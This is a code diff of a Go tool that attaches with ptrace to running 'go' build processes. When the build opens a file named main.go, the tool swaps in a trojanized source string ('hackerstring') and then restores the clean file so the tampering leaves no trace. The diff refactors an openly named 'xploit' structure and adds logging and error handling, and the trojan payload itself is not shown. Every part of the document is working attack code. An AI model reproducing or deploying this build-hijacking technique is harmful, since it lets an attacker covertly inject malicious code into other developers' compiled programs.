@@ -21,26 +21,30 @@ func init() {
 }
 	`
 
-type xploit struct {
+type target struct {
 	pid         int
 	cleanSource []byte
 	path        string
-	isPatched   bool
 }
 
-var xploits []xploit
+var targets []target
 
-func (e xploit) patch() error {
-	original, err := patchfile(e.path, hackerstring)
+func (t target) patch() error {
+	log.Printf("Patching")
+	original, err := patchfile(t.path, hackerstring)
 	if err != nil {
 		log.Printf("Unable to patch file with trojan, %v", err)
+		return err
 	}
-	copy(e.cleanSource, original)
-	return err
+	copy(t.cleanSource, original)
+	return nil
 }
 
-func (e xploit) clean() error {
-	err := cleanfile(e.path, e.cleanSource)
+func (t target) clean() error {
+	log.Printf("Cleaning")
+	syscall.PtraceDetach(t.pid)
+	fmt.Printf(t.path)
+	err := cleanfile(t.path, t.cleanSource)
 	if err != nil {
 		log.Printf("Unable to replace trojanized source with clean source, %v", err)
 	}
@@ -48,59 +52,74 @@ func (e xploit) clean() error {
 	return err
 }
 
-func (e xploit) trace() error {
-	var regs syscall.PtraceRegs
-	var err error
+func (t target) trace() error {
+	defer t.clean()
 
+	regs := syscall.PtraceRegs{}
 	exit := true
+	pid := t.pid
 
-	_ = syscall.PtraceAttach(e.pid)
+	err := syscall.PtraceAttach(pid)
+	if err != nil {
+		log.Printf("Error attaching, %v", err)
+		return err
+	}
 
 	for {
 		if exit {
-			err = syscall.PtraceGetRegs(e.pid, &regs)
+			err = syscall.PtraceGetRegs(pid, &regs)
 			if err != nil {
-				break
+				log.Printf("Error gettings regs for pid: %d, %v", pid, err)
+
 			}
 
-			name, _ := sec.ScmpSyscall(regs.Orig_rax).GetName()
+			name, err := sec.ScmpSyscall(regs.Orig_rax).GetName()
+			if err != nil {
+				log.Printf("Error gettings name, %v", err)
+				return nil
+			}
 			if name == "openat" {
 
-				path, err := getOpenAtPath(e.pid, regs)
+				path, err := getOpenAtPath(pid, regs)
 				if err != nil {
 					fmt.Println(err)
 				}
-				e.path = path
+				t.path = path
 
 				if strings.Contains(path, "main.go") {
-					fmt.Printf("Path: %s\n", e.path)
+					fmt.Printf("Path: %s\n", t.path)
 					fmt.Printf("Name: %s\n", name)
-					err = e.patch()
+					err = t.patch()
 					if err != nil {
 						log.Printf("Error patching file, %v", err)
 					}
 
 				}
 			}
+
+		}
+		err = syscall.PtraceSyscall(pid, 0)
+		if err != nil {
+			log.Printf("Error, %v", err)
+			return nil
 		}
 
-		err = syscall.PtraceSyscall(e.pid, 0)
+		_, err = syscall.Wait4(pid, nil, 0, nil)
 		if err != nil {
-			break
-		}
-
-		_, err = syscall.Wait4(e.pid, nil, 0, nil)
-		if err != nil {
-			break
+			log.Printf("Error, %v", err)
+			return nil
 		}
 
 		exit = !exit
+
 	}
+
 	return nil
 }
 
 func main() {
-	xploits = []xploit{}
+	log.Printf("Starting")
+	targets = []target{}
 	c := make(chan os.Signal)
 
 	signal.Notify(c, os.Interrupt, syscall.SIGTERM)
@@ -113,24 +132,24 @@ func main() {
 	//Main control loop
 	for {
 		//Loop through list of exploit targets and clean up
-		for idx, xpl := range xploits {
+		for idx, xpl := range targets {
 			_, err := ps.FindProcess(xpl.pid)
 			if err != nil {
+				log.Printf("Cleaning Target %d", xpl.pid)
 				err = xpl.clean()
 				if err == nil {
 					//remove target from slice
-					xploits = removeIndex(xploits, idx)
-					break
+					targets = removeIndex(targets, idx)
 				}
 
 			}
 		}
 		//find new targets
-		findproc(&xploits)
+		findproc()
 	}
 }
 
-func findproc(exploit *[]xploit) {
+func findproc() {
 	procs, err := ps.Processes()
 	if err != nil {
 		fmt.Println(err)
@@ -138,14 +157,19 @@ func findproc(exploit *[]xploit) {
 	}
 
 	for _, proc := range procs {
-		exec := proc.Executable()
+		if proc.Executable() == "go" {
 
-		if exec == "go" {
-			eh, _ := os.FindProcess(proc.Pid())
-			xploit := xploit{
-				pid: eh.Pid,
+			if len(targets) == 0 {
+				log.Printf("Found Target, %d", proc.Pid())
+
+				eh, _ := os.FindProcess(proc.Pid())
+				newTarget := target{
+					pid: eh.Pid,
+				}
+				targets = append(targets, newTarget)
+				newTarget.trace()
 			}
-			xploits = append(xploits, xploit)
+
 		}
 	}
 }
@@ -177,7 +201,8 @@ func patchfile(path string, trojan string) ([]byte, error) {
 func cleanfile(path string, original []byte) error {
 	f, err := os.OpenFile(path, os.O_RDWR|os.O_CREATE|os.O_TRUNC, 0755)
 	if err != nil {
-		log.Fatal(err)
+		log.Printf("Error opening file %v", err)
+		return err
 	}
 
 	_, err = f.Write(original)
@@ -221,6 +246,6 @@ func contains(s []int, e int) bool {
 	return false
 }
 
-func removeIndex(s []xploit, index int) []xploit {
+func removeIndex(s []target, index int) []target {
 	return append(s[:index], s[index+1:]...)
 }
